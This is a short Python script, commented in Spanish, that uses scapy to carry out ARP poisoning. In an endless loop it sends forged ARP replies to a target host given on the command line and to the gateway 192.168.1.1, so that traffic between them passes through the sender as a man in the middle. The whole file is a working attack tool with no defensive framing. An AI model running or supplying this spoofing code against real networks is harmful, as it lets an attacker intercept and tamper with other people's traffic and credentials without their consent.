#envenenanmiento arp
import scapy.all as scapy
import argparse
import time

def get_arguments():
    parser = argparse.ArgumentParser(description="envenenamiento arp")
    parser.add_argument("-t", "--target",required=True, dest="ip_addres", help="HOST or RANGE to spoof")
    return parser.parse_args()

def spoof(ip_addres, spoof_ip):
    arp_packer = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_addres, hwsrc="aa:bb:cc:44:55:66")
    scapy.send(arp_packer, verbose=False)


def main():
    while True:
         ip_addres = get_arguments()
         spoof(ip_addres.ip_addres, "192.168.1.1")
         spoof("192.168.1.1", ip_addres.ip_addres)
         time.sleep(2)

if __name__ == "__main__":
    main()